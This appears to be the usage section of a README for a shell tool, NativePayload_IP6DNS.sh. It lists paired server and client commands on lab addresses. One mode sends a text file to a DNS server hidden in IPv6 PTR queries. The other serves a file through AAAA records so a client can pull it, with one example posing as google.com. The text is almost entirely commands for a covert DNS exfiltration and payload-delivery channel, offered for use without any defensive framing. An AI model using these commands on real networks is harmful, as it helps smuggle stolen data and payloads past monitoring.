Pictures for two sysntaxes :

Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r

Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx

example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r

example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222

Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server

Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx

Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4"

example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234

example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110

Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query
